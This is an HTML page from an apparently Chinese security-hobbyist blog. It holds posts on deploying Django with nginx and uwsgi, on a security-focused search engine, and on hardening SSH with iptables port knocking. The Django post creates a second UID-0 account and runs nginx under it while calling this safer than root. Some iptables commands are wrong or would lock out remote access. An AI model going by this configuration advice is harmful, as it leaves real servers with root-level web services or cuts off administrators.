@@ -1,0 +1,2092 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>Junay的博客</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="CTF、网络安全爱好者">
+<meta name="keywords" content="CTF,网络安全">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Junay的博客">
+<meta property="og:url" content="http://yoursite.com/page/5/index.html">
+<meta property="og:site_name" content="Junay的博客">
+<meta property="og:description" content="CTF、网络安全爱好者">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Junay的博客">
+<meta name="twitter:description" content="CTF、网络安全爱好者">
+
+
+
+
+
+<link rel="icon" href="/images/favicon.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.svg" alt="Junay的博客" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">Home</a>
+                
+                <a class="navbar-item"
+                href="/archives">Archives</a>
+                
+                <a class="navbar-item"
+                href="/categories">Categories</a>
+                
+                <a class="navbar-item"
+                href="/tags">Tags</a>
+                
+                <a class="navbar-item"
+                href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-01-17T18:00:00.000Z">2018-01-18</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    13 分钟 读完 (大约 1951 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/01/django-nginx-uwsgi/">部署Django项目</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;月初一直在忙于期末复习准备考试，导致博客处于断更状态，考完试后就忙于为“黑塔”项目增加爬虫，并将项目正式部署该项目。现在已经完成了初步的部署，所以是时候更新博客和记录部署时遇到的一些问题。其实，开个博客也是能很好的鞭策自己去学习东西，就是为了博客不处于断更状态。</p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a href="#1">一：部署概述</a></li>
+<li><a href="#2">二：收集项目中的静态文件</a></li>
+<li><a href="#3">三：安装及配置uwsgi</a></li>
+<li><a href="#4">四：安装及配置nginx</a></li>
+<li><a href="#5">五：启动服务</a></li>
+<li><a href="#6">六：部署中遇到的问题及解决方案</a></li>
+</ul>
+<h3 id="部署概述"><a href="#部署概述" class="headerlink" title="部署概述"></a><a name="1"></a>部署概述</h3><p>&emsp;&emsp;在本文中采用<code>nginx + uwsgi</code>的部署方案，这也是目前较为受欢迎的方案。先放一张整个系统的架构图：</p>
+<div align="center"><br>    <img src="/images/posts/other/12.png"><br></div>
+
+<p>&emsp;&emsp;在这个方案中，nginx主要处理静态页面，而uwsgi处理动态页面，整个系统对外体现为nginx，当nginx发现请求的是动态页面时会将请求发送给uwsgi处理，这两者之间的通信桥梁可以是端口或者sock的形式，本文采用sock文件的形式，听说这种方式比端口通信更加有效。</p>
+<h3 id="收集项目中的静态文件"><a href="#收集项目中的静态文件" class="headerlink" title="收集项目中的静态文件"></a><a name="2"></a>收集项目中的静态文件</h3><p>&emsp;&emsp;很多博客里都把这一步放到最后，但这给刚学部署的人很不好的体验，使人对整个部署过程很模糊，所以我这里先收集项目中的静态文件。说明：静态文件的位置<code>没有要求</code>，收集静态文件的目的是让nginx更好的处理它，如果直接使用APP里的静态文件会<code>导致</code>后台Admin的css、js等<code>无法加载</code>，所以我们需要先收集静态文件。</p>
+<p>&emsp;&emsp;在项目的<code>setting.py</code>中添加静态文件存放的目录，添加内容如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="hljs-string">'/static/'</span></span><br><span class="line"><span class="hljs-comment"># STATIC_ROOT就是静态文件的路径，可以自由设置，下面配置uwsgi、nginx需要使用到这个路径</span></span><br><span class="line">STATIC_ROOT = <span class="hljs-string">'/root/django/static/'</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;在<code>manage.py</code>的目录下运行<code>python manage.py collectstatic</code>收集静态文件。</p>
+<h3 id="安装及配置uwsgi"><a href="#安装及配置uwsgi" class="headerlink" title="安装及配置uwsgi"></a><a name="3"></a>安装及配置uwsgi</h3><p>&emsp;&emsp;在django的python环境中执行：<code>pip install uwsgi</code>即可。</p>
+<p>&emsp;&emsp;配置uwsgi，本文采用.ini的文件形式配置。新建一个新的文件夹，可以在任意位置。如本文中在与django项目同级的目录下新建一个名为：uwsgi的文件夹，名字可以任意取。</p>
+<p><div align="center"><br>    <img src="/images/posts/other/13.png"><br></div><br>&emsp;&emsp;其中<code>web</code>是项目文件夹，<code>uwsgi</code>文件夹用来存放uwsgi的配置文件和日志等。</p>
+<p>&emsp;&emsp;在uwsgi中新建一个<code>uwsgi.ini</code>的文件，具体内容如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> uwsig使用配置文件启动</span></span><br><span class="line">[uwsgi]</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 项目根目录，并非是app目录</span></span><br><span class="line">chdir=/root/django/web/</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> wsgi.py的路径，first是wsgi.py存在的目录名</span></span><br><span class="line">module=first.wsgi:application</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 指定sock的文件路径，用来与nginx通信       </span></span><br><span class="line">socket=/root/django/uwsgi/uwsgi.sock</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 进程个数       </span></span><br><span class="line">workers=4</span><br><span class="line">pidfile=/root/django/uwsgi/uwsgi.pid</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 指定IP端口，这里可以用来测试uwsgi与django项目之间是否准确连接。调试好后可以注释掉</span></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 如果开启了可以不用开启nginx服务而直接通过 ip:8080访问网页。       </span></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> http=192.168.2.108:8080</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 这里使用上面收集的静态文件夹目录</span></span><br><span class="line">static-map=/static=/root/django/static</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 启动uwsgi的用户名和用户组</span></span><br><span class="line">uid=junay</span><br><span class="line">gid=root</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 启用主进程</span></span><br><span class="line">master=true</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 自动移除unix Socket和pid文件当服务停止的时候</span></span><br><span class="line">vacuum=true</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 序列化接受的内容，如果可能的话</span></span><br><span class="line">thunder-lock=true</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 启用线程</span></span><br><span class="line">enable-threads=true</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 设置自中断时间</span></span><br><span class="line">harakiri=30</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 设置缓冲</span></span><br><span class="line">post-buffering=4096</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 设置日志目录</span></span><br><span class="line">daemonize=/root/django/uwsgi/uwsgi.log</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;上面配置文件的每一条都有详细的说明，请大家仔细阅读。这里需要注意的是，我为这个项目专门添加了一个<code>junay</code>的用户，并且将它添加到<code>root</code>用户组。后面我还是使用这个用户开启nginx服务。我们需要特别注意用户权限的问题，这个问题也困扰了我两天。</p>
+<h3 id="安装及配置nginx"><a href="#安装及配置nginx" class="headerlink" title="安装及配置nginx"></a><a name="4"></a>安装及配置nginx</h3><p>&emsp;&emsp;nginx直接使用apt安装即可。安装完成后我们在<code>/etc/nginx/conf.d/</code>目录下为nginx与uwsgi通信建立配置文件。文件名可以任意，内容如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">    # nginx服务开启的端口</span><br><span class="line">    listen 80; </span><br><span class="line">    # 如果有域名则写上域名，否则使用IP地址</span><br><span class="line">    server_name www.secsearch.top; </span><br><span class="line">    # Nginx日志配置</span><br><span class="line">    access_log /var/log/nginx/access.log; </span><br><span class="line">    charset utf-8; # Nginx编码</span><br><span class="line">    gzip_types text/plain application/x-javascript text/css text/javascript application/x-httpd-php application/json text/json image/jpeg image/gif image/png application/octet-stream; # 支持压缩的类型</span><br><span class="line"></span><br><span class="line">    error_page 404 /404.html; # 错误页面</span><br><span class="line">    error_page 500 502 503 504 /50x.html; # 错误页面</span><br><span class="line"></span><br><span class="line">    # 指定项目路径uwsgi</span><br><span class="line">    location / &#123;</span><br><span class="line">        # uwsgi_params在nginx文件夹下</span><br><span class="line">        include /etc/nginx/uwsgi_params; </span><br><span class="line">        # 设置连接uWSGI超时时间</span><br><span class="line">        uwsgi_connect_timeout 30; </span><br><span class="line">        # nginx与uwsgi的通信方式，动态请求会通过sock传递给uwsgi处理</span><br><span class="line">        uwsgi_pass unix:/root/django/uwsgi/uwsgi.sock; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 这里使用上面收集的静态文件夹目录</span><br><span class="line">    location /static/ &#123;</span><br><span class="line">    alias /root/django/static/;</span><br><span class="line">    index index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a><a name="5"></a>启动服务</h3><p>&emsp;&emsp;接下来我们启动uwsgi，进入刚才新建的uwsgi文件夹，通过配置文件启动uwsgi：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --ini uwsgi.ini</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;执行后会在该文件夹下生成uwsgi.log用来记录uwsgi日志，我们可以先查看一下该文件，以保证我们的uwsgi服务是正常的。</p>
+<p>&emsp;&emsp;然后我们启动nginx：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;现在通过域名（如果你上面配置的是域名，否则使用IP）访问网站，看是否正常运行。如果你能成功运行那么恭喜你，你可以不用往下看了，如果你出现了一些错误，那么可以借鉴我的解决思路。再附上关闭uwsgi服务和nginx的命令：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">killall -9 uwsgi</span><br><span class="line">service nginx stop</span><br></pre></td></tr></table></figure></p>
+<h3 id="部署中遇到的问题及解决方案"><a href="#部署中遇到的问题及解决方案" class="headerlink" title="部署中遇到的问题及解决方案"></a><a name="6"></a>部署中遇到的问题及解决方案</h3><p>&emsp;&emsp;这里我访问网站后发现是<code>502</code>错误，这也是我遇到的一个大坑，很多博客都没有解释和解决掉这个问题。</p>
+<p>&emsp;&emsp;出现502后查看日志文件：<code>cat /var/log/nginx/access.log</code>，发现是权限问题，原来nginx默认是<code>www-data</code>用户运行，但该用户没有权限访问<code>root</code>下的目录文件，所以导致服务器出现错误。所以我们需要以<code>root</code>身份运行，但root实在是太敏感，所以上面专门添加的用户<code>junay</code>就起作用了。</p>
+<p>&emsp;&emsp;首先我们修改junay的权限，通过：<code>vim /etc/passwd</code>，将juany修改成如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">junay:x:0:0:,,,:/home/junay:/usr/bin/git-shell</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里我们将junay的默认shell设成git-shell，防止该用户登陆bash，其次，我们再修改<code>/etc/ssh/sshd_config</code>，在该文件中添加如下两行，禁止junay使用ssh。<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowUsers root</span><br><span class="line">DenyUsers junay</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;最后我们修改nginx的默认用户，改配置文件为<code>/etc/nginx/nginx.conf</code>，将它的user一行改为：</p>
+<p><div align="center"><br>    <img src="/images/posts/other/14.png"><br></div><br>&emsp;&emsp;修改完成后，我们重新启动nginx，使用：<code>service nginx restart</code>，现在我们就成功的完成了django的部署。如果你还是出现了问题，那么请仔细查看<code>uwsgi和nginx的日志文件</code>。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-24T15:00:00.000Z">2017-12-24</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 835 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/security-search/">“黑塔”-一款专注于网络安全的垂直搜索引擎</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>&emsp;&emsp;这个项目，<a href="https://www.secsearch.top" target="_blank" rel="noopener">项目地址</a>，暂且称为<code>“黑塔”</code>，愿景是能够成为网络安全中的一座灯塔，为<code>寻路</code>的人提供方向。它是一款专注于<code>网络安全</code>的<code>垂直搜索引擎</code>。  </p>
+<p>&emsp;&emsp;一开始想到这个项目的初衷是锻炼自己的开发能力，以及方便自己需要的时候查找资料。但在后来，作者发现网上<code>还没有</code>一款专注于网络安全的垂直搜索引擎，遂萌发自己打造一款引擎。也许有人会觉得百度、Google等主流搜索引擎那么强大，哪还需要自己专门开发一款垂直搜索引擎，但事实上并非如此，这里不是说它们不够强大，而是从<code>另一个角度</code>思考问题，Google等搜索引擎包罗万象，体积庞大，很多时候无法收录全面，并且更新存在比较大的延迟，这对信息新鲜度要求极高的网安领域来说是一个缺陷，加之很多大佬的优质博客根本没有做所谓的SEO优化，导致即使被搜索引擎收录，其排名也比较低下，用户需要特别注意才能发觉。  </p>
+<p>&emsp;&emsp;而作为垂直搜索引擎，它拥有<code>短小精悍</code>、<code>更新速度快</code>、<code>信息来源准确</code>的特点，它能够给用户提供<code>新鲜</code>、<code>准确</code>、<code>原创</code>的信息，这就是垂直搜索引擎存在的意义。  </p>
+<p>&emsp;&emsp;“黑塔”的收录信息主要来源于网络安全领域各大佬的<code>博客</code>、<code>安全论坛</code>等专业、可信的信息源，所以，在这里，你能得到更加<code>准确</code>、<code>新鲜</code>的信息，要知道，在网安领域，一个<code>漏洞</code>或<code>EXP</code>晚一小时到你手里所产生的影响都是不同的。“黑塔”的另一个特点就是对<code>新手</code>朋友帮助较大，<code>刚入门</code>或还在<code>入门阶段</code>的人可以把“黑塔”作为<code>增加知识储备</code>的手段，这里有着各网安大佬的原创文章、实战记录，潜心阅读并加以复现对提高自己的技术水平是很有帮助的。  </p>
+<p>&emsp;&emsp;目前，“黑塔”的开发工作仍在继续，<code>不管</code>它是否能受到用户欢迎，<code>也不管</code>它的用户量能有多大，作者都将<code>继续</code>完善、丰富它，以此作为作者增加开发经验、学习网安技术的手段。如果你有好的建议、想法或者本站的漏洞，也欢迎联系我，我相信你能找到我的联系方式。</p>
+<p>&emsp;&emsp;最后，希望大家能在<code>光怪陆离</code>、<code>包罗万象</code>的“黑客世界”中找到属于自己的路，也希望“黑塔”能在你成长的过程中给予你帮助，在这个充满<code>黑、白、灰</code>的世界中，<strong>坚持初心</strong>，<strong>不越雷池</strong>，才能<strong>方得始终</strong>。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-22T16:00:00.000Z">2017-12-23</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    12 分钟 读完 (大约 1798 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/iptables/">通过iptables配置加强服务器安全</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="绪言"><a href="#绪言" class="headerlink" title="绪言"></a>绪言</h2><p>&emsp;&emsp;VPS在公网上使用得越来越多，如何提高自己的服务器安全也变得重要起来，特别是脚本横飞的时代，如果不对服务器加以修饰，每天<code>lastb</code>的记录都能增加很多。而且对外提供越多的服务意味着暴露的缺陷就越多，所以掌握<code>iptables</code>的基本使用中解决很多问题。</p>
+<h3 id="主动模式"><a href="#主动模式" class="headerlink" title="主动模式"></a>主动模式</h3><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;首先对自己<code>主动</code>发送的请求进行响应的报文放行，这里尤其注意是对自己已发送的报文进行响应，如果是其他客户端发送过来的请求连接这里不做处理，使用<code>默认的</code>或后续的匹配策略处理。<br>因为在iptables看来每个协议都有<code>建立连接</code>的概念，包括“udp”、“icmp”。<code>state</code>支持的状态有：NEW、ESTABLISHED、RELATED、INVALID、UNTRACKED。</p>
+<ul>
+<li>NEW：就是双方进行通信时第一个到来的报文；</li>
+<li>ESTABLISHED：state把NEW以后到来的报文都定义为ESTABLISHED状态，包括UDP等，所以说state是有类似于tcp三次握手建立连接的概念；</li>
+<li>RELATED：在一个服务中，可能开启了两个进程，而且这两个进程都需要跟服务器进行通信，例如FTP有两个通信链路，命令链路和传输数据的链路，这两个链路就是存在关系的，所以他们属于RELATED状态；</li>
+<li>INVALID：表示一个包不能被识别；</li>
+<li>UNTRACKED：表示报文不能被追踪；</li>
+</ul>
+<h3 id="为SSH加固"><a href="#为SSH加固" class="headerlink" title="为SSH加固"></a>为SSH加固</h3><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -m length --length 128 -m recent --set --name SSH --rsource -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<code>length</code>模块用于匹配报文长度，这里我们用ping报文的长度来充当芝麻开门的作用，<code>recent</code>模块功能很强，能将匹配到的报文信息记录下来，给后续规则做条件使用。它的几个参数为：</p>
+<ul>
+<li>—name： 给用来记录报文的列表起名称；（这里应该是两个-）</li>
+<li>—set： 表示将匹配到的报文记录下来；</li>
+<li>—rsource: 表示记录源IP地址；</li>
+</ul>
+<p>&emsp;&emsp;这条指令的意思是：将ping报文长度为128的源IP地址记录到叫SSH的列表中去。这里需要注意的是ping报文头部长度就有28字节，所以实际的填充报文为：128-28=100。所以在Linux下使用<code>ping -s 100 ip</code>；在Windows下使用<code>ping -l 100 ip</code>来敲开服务器大门。</p>
+<p>&emsp;&emsp;相关的icmp报文的类型如下（因为ssh客户端是ping的请求方（发起方），所以这里要匹配类型为8的报文）：</p>
+<table>
+<thead>
+<tr>
+<th>类型代码</th>
+<th>类型描述               </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>响应应答（ECHO-REPLY）  </td>
+</tr>
+<tr>
+<td>3</td>
+<td>不可到达                </td>
+</tr>
+<tr>
+<td>4</td>
+<td>源抑制                  </td>
+</tr>
+<tr>
+<td>5</td>
+<td>重定向                 </td>
+</tr>
+<tr>
+<td>8</td>
+<td>响应请求（ECHO-REQUEST）</td>
+</tr>
+<tr>
+<td>11</td>
+<td>超时                    </td>
+</tr>
+<tr>
+<td>12</td>
+<td>参数失灵                 </td>
+</tr>
+<tr>
+<td>13</td>
+<td>时间戳请求               </td>
+</tr>
+<tr>
+<td>14</td>
+<td>时间戳应答               </td>
+</tr>
+<tr>
+<td>15</td>
+<td>信息请求（*已作废）       </td>
+</tr>
+<tr>
+<td>16</td>
+<td>信息应答（*已作废）       </td>
+</tr>
+<tr>
+<td>17</td>
+<td>地址掩码请求              </td>
+</tr>
+<tr>
+<td>18</td>
+<td>地址掩码应答             </td>
+</tr>
+</tbody>
+</table>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 8888 -m state --state NEW -m recent --rcheck --seconds 20 --name SSH --rsource -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;8888是ssh修改后的端口号，这里之所以匹配NEW状态是因为后面我们需要对INPUT使用<code>白名单</code>策略，而NEW之后的状态在前面已经放行，所以这里需要对NEW状态进行放行。这里再对recent的两个参数进行说明：</p>
+<ul>
+<li>—rcheck： 检查源IP是否在列表中，以第一个匹配开始计算时间</li>
+<li>—seconds： 记录的源IP地址的有效时间</li>
+</ul>
+<p>&emsp;&emsp;所以这一整句话是说对NEW（新建）状态下请求8888端口的源IP进行检查，看这个IP是否在名叫SSH的列表之中，有效时间是20秒，这里的有效时间是指上一条规则记录下源IP的时间离用户请求SSH服务器的时间间隔。所以用户必须在ping完的20秒内连接客户端，否则连接失败，重新ping。</p>
+<pre><code>PS： 如果是私有的git服务器的话，也同样适用这套规则，登陆或clone、push前都需要进行特殊的操作，这就能很好的保护数据和服务器的安全问题。不要以为这是弱智的问题，，这两天逛tools的时候就有人的git服务器被人攻破。。。
+</code></pre><h3 id="将INPUT策略改成白名单模式"><a href="#将INPUT策略改成白名单模式" class="headerlink" title="将INPUT策略改成白名单模式"></a>将INPUT策略改成白名单模式</h3><p>&emsp;&emsp;白名单是<code>只接受自己信任</code>的来源，而对非信任区来源采用拒绝策略；黑名单则只拒绝自己不信任的来源，接受<code>信任或目的不明确</code>的来源。所以采用白名单的策略系统的安全性较高，而黑名单难免会有疏忽。</p>
+<p>&emsp;&emsp;要使用白名单，只需将INPUT的默认策略从ACCEPT改成DROP。可以使用<code>iptables -P DROP</code>,但如果一不小心清空了<code>ACCEPT</code>的规则，那么服务器将按照默认drop的策略拒绝所有的连接，导致服务器失联。所以我们使用另一种较为安全的策略：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -j DROP</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;我们在INPUT链的最后一条上加上<code>DROP</code>规则，这样即使我们不小心<code>iptables -F INPUT</code>清除掉INPUT规则也不用担心服务器失联。</p>
+<p>&emsp;&emsp;值得一提的是，由于采用了DROP策略，所以ping只接收长度为100的报文，也就是说正常的ping是<code>不会被服务器接收</code>的，这就提供了保护主机的安全的方法，相当于把主机从公网中<code>隐藏</code>起来，只有知道口令的人才能找得到。</p>
+<h3 id="保存iptables配置"><a href="#保存iptables配置" class="headerlink" title="保存iptables配置"></a>保存iptables配置</h3><p>&emsp;&emsp;笔者主机为：Ubuntu 16.04，首先安装：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install iptables-persistent</span><br><span class="line">apt install netfilter-persistent    # ubuntu 14.04可以不用</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;保存：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netfilter-persistent save</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;在/etc/rc.local中添加开机时自动执行恢复操作：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netfilter-persistent reload</span><br></pre></td></tr></table></figure></p>
+<h3 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h3><p>&emsp;&emsp;这里只是简单的在INPUT中加固了ssh连接，但对其他类似web的服务没有讲解，但这并不是说iptables对这些服务没有办法，相反，iptables能很好的加强系统安全。比如有些服务不想暴露给外部直接访问，只允许本地处理。这时我们就能使用类似于这样的规则：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT ! -s 127.0.0.1 -j DROP</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;通过配置iptables还可以在有限程度上防止<code>CC攻击</code>、<code>DDOS</code>等攻击，它可用的一些模块还有：</p>
+<ul>
+<li>string： 可以匹配链路中出现的特定字符；</li>
+<li>time： 对链路的时间规则；</li>
+<li>limit： 对IP的并发限制；</li>
+</ul>
+<p>这在后续博文中可能有所涉及。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-21T14:20:00.000Z">2017-12-21</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    6 分钟 读完 (大约 927 个字)
